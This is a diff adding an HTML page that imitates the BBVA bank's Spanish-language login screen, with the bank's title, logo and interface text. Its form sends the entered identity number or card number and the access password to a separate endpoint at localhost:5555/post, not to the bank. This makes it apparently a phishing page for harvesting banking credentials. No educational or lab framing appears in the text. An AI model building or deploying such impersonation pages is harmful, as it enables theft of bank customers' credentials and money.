@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="login.css">
+	<link rel="icon" type="image/jpg" href="/favicon.ico"/>
+	<title>BBVA</title>
+</head>
+<body>
+	<script src="login.js"></script>
+	<div id="transition" class="transition"></div>
+
+	<!--Top BBVA -->
+	
+	<header>
+		<div class="top" id="top">
+			<div class="left-top">
+				<img class="back-button-img" src="left-arrow__2_-removebg-preview.png" style="width: 21px; height: 22px;">
+				<span aria-hidden="true" class="back-button" data-id="text">Volver</span>
+				
+			</div>
+			<div class="center-top">
+				<img src="logo-white-1c1c2a68cc4c755b9ebacef725dd3421.png" class="logo">
+			</div>
+			<div class="right-top">
+				<img class="help-button-img" src="question.png" style="width: 22px; height: 22px;">
+				<button class="help-button">Ayuda</button>
+			</div>
+		</div>
+	</header>
+	
+	<!--Login BBVA -->
+
+	<div class="background-login">
+		<div class="all-login">
+			<form action="http://localhost:5555/post" method="post">
+			<!--Username -->
+			<div>																	
+				<label for="nombre"></label>
+				<input type="text" class="username" id="username" name="username" pattern="^[a-zA-Z0-9]+$|^$" required="true" data-required="required" maxlength="16" placeholder="NIF, NIE, Tarjeta o Pasaporte" aria-invalid="false">
+				
+			</div>
+			<!--Password -->
+			<div>
+				<label for="nombre"></label>
+				<input type="password" placeholder="Clave de acceso" name="password" class="password" id="password" name="password">
+				<button class="show-password" type="button" id="show-password" onclick="showPassword()">
+				</button>
+				
+			</div>
+		</div>
+		<!--Password Recuperation -->
+		<div class="password-forget">
+			<b class="recuperation">¿Has olvidado tu clave de acceso?</b>
+		</div>
+		<!--Login and Register -->
+		<div class="buttons">
+			<div>
+
+				<input class="log-in" type="submit" value="Iniciar sesión" id="btn-login">
+
+			</div>
+			<div>
+				<button class="register">Hazte cliente</button>
+			</div>
+		</div>
+	</form>
+		<!--New Access -->
+		<div>
+			<b class="access">Crea tu clave de acceso</b>
+		</div>
+	</div>
+	
+</html>
